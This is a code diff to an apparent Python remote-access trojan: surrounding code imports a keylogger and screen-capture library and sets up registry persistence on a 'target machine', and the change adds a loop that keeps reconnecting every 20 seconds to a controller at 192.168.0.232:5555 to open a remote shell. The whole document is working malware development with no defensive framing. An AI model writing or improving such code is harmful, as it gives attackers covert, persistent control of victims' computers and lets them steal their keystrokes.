@@ -3,6 +3,7 @@ import os
 import socket
 import subprocess
 import threading
+import time
 import pyautogui
 import keylogger
 import shutil
@@ -62,6 +63,18 @@ def persist(reg_name, copy_name):
     except:
         reliable_send('[-] Error creating persistence with target machine')
 
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            s.connect(('192.168.0.232', 5555))
+            shell()
+            s.close()
+            break
+        except:
+            connection()
+
+
 
 def shell():
     while True:
@@ -106,5 +119,7 @@ def shell():
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('192.168.0.232', 5555))
-shell()
+connection()
+
+#s.connect(('192.168.0.232', 5555))
+#shell()
